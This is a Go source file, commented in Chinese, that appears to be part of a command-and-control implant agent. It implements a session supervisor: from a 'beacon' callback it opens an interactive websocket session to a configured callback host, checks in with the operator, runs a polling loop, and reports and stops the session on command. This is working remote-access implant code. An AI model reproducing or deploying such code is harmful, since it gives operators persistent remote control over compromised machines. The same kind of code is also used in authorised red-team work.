package main

import (
	"encoding/json"
	"fmt"
	"strings"
	"sync"
	"time"

	"github.com/google/uuid"
)

type sessionSupervisor struct {
	mu      sync.RWMutex
	config  EmbeddedConfig
	session *AgentController
}

func newSessionSupervisor(config EmbeddedConfig) *sessionSupervisor {
	return &sessionSupervisor{config: config}
}

func (s *sessionSupervisor) StartSession(parent *AgentController, task Task) TaskResponse {
	if parent.role != CallbackRoleBeacon {
		return roleError(task.ID, "session_start 只能在 beacon callback 上执行")
	}
	if !s.config.EnableSessionMode {
		return roleError(task.ID, "当前 payload 未启用 session mode")
	}
	websocketProfile, ok := s.config.Profiles["websocket"]
	if !ok || strings.TrimSpace(websocketProfile.CallbackHost) == "" {
		return roleError(task.ID, "缺少 websocket profile 配置，无法建立 session")
	}

	s.mu.Lock()
	if s.session != nil {
		callbackUUID := s.session.CallbackUUID()
		s.mu.Unlock()
		message := "session 已存在"
		if callbackUUID != "" {
			message += ": " + callbackUUID
		}
		return TaskResponse{TaskID: task.ID, UserOutput: message, Completed: true, Status: "success"}
	}
	s.mu.Unlock()

	var params struct {
		SessionLinkID string `json:"session_link_id"`
	}
	if strings.TrimSpace(task.Parameters) != "" {
		_ = json.Unmarshal([]byte(task.Parameters), &params)
	}
	if strings.TrimSpace(params.SessionLinkID) == "" {
		params.SessionLinkID = uuid.NewString()
	}

	transport, err := newWebsocketTransport(websocketProfile, s.config.InsecureSkipVerify)
	if err != nil {
		return roleError(task.ID, "建立 websocket session 失败: "+err.Error())
	}
	controller, err := newAgentController(CallbackRoleSession, s.config, websocketProfile, transport, params.SessionLinkID)
	if err != nil {
		_ = transport.Close()
		return roleError(task.ID, "初始化 session controller 失败: "+err.Error())
	}
	if err := controller.checkin(); err != nil {
		_ = transport.Close()
		return roleError(task.ID, "session checkin 失败: "+err.Error())
	}

	// 先注册到 supervisor，再进入长轮询循环，避免刚启动就被并发 status 查询看不到。
	s.mu.Lock()
	s.session = controller
	s.mu.Unlock()

	go func() {
		controller.Run()
		s.clearSession(controller)
	}()

	message := fmt.Sprintf("session 正在建立: link=%s callback_uuid=%s", params.SessionLinkID, controller.CallbackUUID())
	return TaskResponse{TaskID: task.ID, UserOutput: message, Completed: true, Status: "success"}
}

func (s *sessionSupervisor) StopSession(task Task) TaskResponse {
	s.mu.RLock()
	controller := s.session
	s.mu.RUnlock()
	if controller == nil {
		return TaskResponse{TaskID: task.ID, UserOutput: "当前没有活动中的 session", Completed: true, Status: "success"}
	}
	go func() {
		time.Sleep(250 * time.Millisecond)
		s.StopActiveSession()
	}()
	return TaskResponse{TaskID: task.ID, UserOutput: "session 正在停止", Completed: true, Status: "success"}
}

func (s *sessionSupervisor) StopActiveSession() {
	s.mu.RLock()
	controller := s.session
	s.mu.RUnlock()
	if controller != nil {
		controller.Stop()
	}
}

func (s *sessionSupervisor) Status(task Task) TaskResponse {
	s.mu.RLock()
	controller := s.session
	s.mu.RUnlock()
	if controller == nil {
		return TaskResponse{TaskID: task.ID, UserOutput: "session: inactive", Completed: true, Status: "success"}
	}
	status := fmt.Sprintf("session: active role=%s callback_uuid=%s link=%s", controller.role, controller.CallbackUUID(), controller.sessionLink)
	return TaskResponse{TaskID: task.ID, UserOutput: status, Completed: true, Status: "success"}
}

func (s *sessionSupervisor) clearSession(controller *AgentController) {
	s.mu.Lock()
	defer s.mu.Unlock()
	if s.session == controller {
		s.session = nil
	}
}

func roleError(taskID string, message string) TaskResponse {
	return TaskResponse{
		TaskID:     taskID,
		UserOutput: message,
		Completed:  true,
		Status:     "error: invalid callback role",
	}
}
